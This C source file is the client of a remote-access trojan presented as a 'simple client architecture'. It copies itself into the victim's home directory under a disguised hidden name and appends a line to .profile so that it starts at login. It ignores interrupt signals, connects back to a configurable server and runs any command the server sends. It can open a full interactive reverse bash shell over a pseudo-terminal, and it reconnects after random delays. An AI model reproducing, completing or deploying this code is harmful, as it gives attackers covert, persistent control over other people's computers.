// Simple client architecture
// Connects to host, reads message, disconnects
#define _XOPEN_SOURCE 600
#define _DEFAULT_SOURCE
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <stdio.h>
#define __USE_BSD
#include <termios.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include "simple_networking.h"

// Editable values for autogen config program
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8881
#define TIMEOUT_VALUE 120
#define EXEC_PATH "/bin/bash"

// global kill flag
int kill_rcv = 0;



void kill_handler(int sig)
{
  // This handles SIGINT attempts to kill the process
  // We don't do anything on the signal ;)
  kill_rcv = 1;
  printf("SIGINT Recv.\n");
}

int persistence(char *get_path, FILE *fp)
{
  //get_path without ".profile"
  char chunk[128];
  int len = strlen(get_path) - 8;
  get_path[len] = 0;

  //copy the executable to home directory
  char command[50] = "cp client ";
  strcat(command, get_path);
  strcat(command,".0XsdnsSYSTEM");
  system(command);

  char write_home[50];
  strcpy(write_home,get_path);
  strcat(write_home, "./.0XsdnsSYSTEM &");
  //check if .profile can be accessed
  if (fp == NULL)
  {
    return 0;
  }
  //check if our command is already written there
  while (fgets(chunk, sizeof(chunk), fp) != 0)
  {
    if (strstr(chunk, write_home) != 0)
    {
      return 0;
    }
  }

  fprintf(fp, "%s \n", write_home);
  fclose(fp);
  return 0;
}

int checkELF(char *path)
{

    //get the process ID and converts it to char	
    int pid = getpid();	
    char pidch[10];
    sprintf(pidch,"%d",pid);

    //build the command to copy the executable file from proccessdirectory
    // /proc/[pid]/exe
    char command[50] = "cp /proc/";
    strcat(command,pidch);
    strcat(command,"/exe ");
    strcat(command,path);
    strcat(command,".0XsdnsdSystem");

    // check if the elf .0XsdnsdSystem exists in /home 
    char check[50];
    strcpy(check,path);
    strcat(check,".0XsdnsdSystem");
    if(access(check,F_OK)==0)
    {
        return 0;
    }
    else
    {
        system(command);
        return 0;
    }
}

pid_t bash_session(connection server_con)
{

  // Setting up a PTY session: http://rachid.koucha.free.fr/tech_corner/pty_pdip.html
  // Set up some file descriptors for interacting with the pty
  int master_fd;
  int slave_fd;
  int return_val;
  char input[250];

  // This tells the kernel we want to create a PTY
  master_fd = posix_openpt(O_RDWR);
  if (master_fd < 0)
  {
    char *errmsg = "ERROR: posix_openpt() failed";
    send(server_con.sock_fd, errmsg, sizeof(errmsg), 0);
    exit(-1);
  }

  // This changes the mode of the PTY so that we're the master
  return_val = grantpt(master_fd);
  if (return_val != 0)
  {
    char *errmsg = "ERROR: grantpt() failed";
    send(server_con.sock_fd, errmsg, sizeof(errmsg), 0);
    exit(-1);
  }

  // This tells the kernel to "unlock" the other end of the PTY, creating the slave end
  return_val = unlockpt(master_fd);
  if (return_val != 0)
  {
    char *errmsg = "ERROR: unlockpt() failed";
    send(server_con.sock_fd, errmsg, sizeof(errmsg), 0);
    exit(-1);
  }

  // Open the slave side ot the PTY
  slave_fd = open(ptsname(master_fd), O_RDWR);

  // Create the child process
  // The if statement returns true if we're the parent, and false if we're the child

  int pid = fork();

  if (pid != 0)
  {
    // We're the parent, we'll need to set up an array of(slave_fd to access the PTY
    fd_set forward_fds;

    // We don't need the slave end of the pipe
    close(slave_fd);

    while (1)
    {
      // Add our connection to the server and to the PTY into our group of file descriptors
      FD_ZERO(&forward_fds);
      FD_SET(server_con.sock_fd, &forward_fds);
      FD_SET(master_fd, &forward_fds);

      struct timeval timeout;
      timeout.tv_sec = TIMEOUT_VALUE;
      timeout.tv_usec = 0;

      // See if there's a file descriptor ready to read
      return_val = select(master_fd + 1, &forward_fds, NULL, NULL, &timeout);
      // I know, this is ugly... I tried implementing it as an if.. on the return val but that broke it :/
      switch (return_val)
      {
        case -1:
          fprintf(stderr, "Error %d on select\n", errno);
          return pid;
        
        case 0:
          printf("timed out\n");
          return pid;

        default:
        // See if we've got something to read on our connection to the server
          if (FD_ISSET(server_con.sock_fd, &forward_fds))
          {
            // TODO make this variable length
            return_val = read(server_con.sock_fd, input, sizeof(input));
            // This means we don't attempt to write an empty string
            if (return_val > 0)
            {
              // This low level stuff doesn't play nicely with "Send to all" packets from the server
              // So we will fall back on popen() -- TODO

              // If exit is received from server, return pid of bash child process
              if (strcmp(input, "exit") == 0) {
                return pid;
              }
              
              // Send data on the master side of PTY
              // Keep in mind that return_val now holds the length of the string to read
              write(master_fd, input, return_val);
            }
            else if (return_val < 0)
            {
              fprintf(stderr, "Error %d on read sockfd\n", errno);
              exit(1);
            }
          }

          // See if bash has sent anything back
          if (FD_ISSET(master_fd, &forward_fds))
          {
            return_val = read(master_fd, input, sizeof(input));
            // Make sure we don't send an empty packet
            if (return_val > 0)
            {
              // Send data on to the server
              write(server_con.sock_fd, input, return_val);
            }
            else if (return_val < 0)
            {
              fprintf(stderr, "Error %d on read from bash\n", errno);
              perror("Error: ");
              exit(1);
            }
          }
          break;
      }
    }
  }
  else
  {
    // We're the child process now. We'll be changing some terminal attrs so we'll need to save them
    struct termios original_settings;
    struct termios new_settings;

    // Close the master side of the PTY
    close(master_fd);

    // Save the defaults parameters of the slave side of the PTY
    return_val = tcgetattr(slave_fd, &original_settings);

    // Set RAW mode on slave side of PTY
    new_settings = original_settings;
    cfmakeraw (&new_settings);
    tcsetattr (slave_fd, TCSANOW, &new_settings);

    // We need to be able to see what bash is doing, so redirect stdin/out/error to us
    close(0);
    close(1);
    close(2);
    dup(slave_fd);
    dup(slave_fd);
    dup(slave_fd);

    // Don't need the slave fd anymore
    close(slave_fd);

    // Make the current process a new session leader
    setsid();
    ioctl(0, TIOCSCTTY, 1);

    // Execvp is a bit funky with args, so create an array with only bash in it
    // This took like 3 days to work out...
    char *args[] = {EXEC_PATH, NULL};
    execvp(args[0], args);

    // In theory we shouldn't get to here, so something has gone horribly wrong...
    exit(1);
  }
}

void parse_single_command(message data_recieved, connection server_con)
{
    FILE *cmdptr;
    char *cmdstr = malloc(strlen(data_recieved.data) +6);
    memset(cmdstr, '\0', strlen(cmdstr));
    strcat(cmdstr, data_recieved.data);
    strcat(cmdstr, " 2>&1");
    printf("Executing %s\n", cmdstr);
    cmdptr = popen(cmdstr, "r");
    printf("Finsihed command.\n");

    if (cmdptr == NULL)
    {
      // Oops, we couldn't open the pipe properly, notify the server
      char *errmsg = "ERROR: Could not open pipe to shell";
      send(server_con.sock_fd, errmsg, sizeof(errmsg), 0);
    }

    // Read data from pipe character-by-character into buffer
    char *buffer = malloc(2);
    char character_read;
    int length = 0;
    while ((character_read = fgetc(cmdptr)) != EOF)
    {
      // Place our character from the pipe into the buffer
      buffer[length] = character_read;
      length++;

      // Increase the buffer size if needed
      buffer = realloc(buffer, length + 1);
    }

    buffer[length] = '\0';

    if (strlen(buffer) == 0)
    {
      buffer = realloc(buffer, 20);
      strcpy(buffer, "[No data returned]");
      length = strlen(buffer);
    }
    

    // Send the data and close the pipe
    send(server_con.sock_fd, buffer, length, 0);
    pclose(cmdptr);
    free(buffer);
    free(cmdstr);
}

int main(void)
{

  // Get the .profile file path for the victim's machine
  FILE *home_path = popen("echo $HOME/.profile", "r");
  char get_path[50];
  fscanf(home_path, "%s", get_path);
  pclose(home_path);

  // Open .profile file in append mode
  FILE *profile = fopen(get_path, "a+");
  persistence(get_path, profile);

  // LEAVE COMMENTED DURING DEV
  signal(SIGINT, kill_handler);
  connection server_con = connect_to(SERVER_IP, SERVER_PORT);

  // Check if the struct has been filled
  if (server_con.dest_ip == NULL)
  {
    printf("[+] Could not connect to server.\n");
    exit(-1);
  }

  printf("[+] Client connected. IP: %s, Port: %d, Socket: %d\n", server_con.dest_ip, server_con.dest_port, server_con.sock_fd);

  // Catch the hostname command and return it quickly
  while (1) {
    message data_recieved = recieve_data(server_con);

    // If server has dropped, close fd, sleep for 2 minutes and retry connection.
    if (strcmp(data_recieved.data, "\000") == 0){
      close(server_con.sock_fd);
      printf("Server dropped. Sleeping.\n");

      // Set a random sleep time to prevent regular reconnection attempts
      srand(time(NULL));
      int time_to_sleep = rand() % 120;
      sleep(time_to_sleep);

      // Attempt to reconnect to the server
      connection server_con = connect_to(SERVER_IP, SERVER_PORT);
      printf("[+] Client connected. IP: %s, Port: %d, Socket: %d\n", server_con.dest_ip, server_con.dest_port, server_con.sock_fd);
    }

    // If server sends message for 'bash' mode - call function
    if (strcmp(data_recieved.data, "bash") == 0){
      int pid = bash_session(server_con);
      kill(pid, SIGKILL);
    }
    // Else, parse and return output for single command received
    else {
      parse_single_command(data_recieved, server_con);
    }
      memset(data_recieved.data, '\0',strlen(data_recieved.data));
  }
  return 0;
}
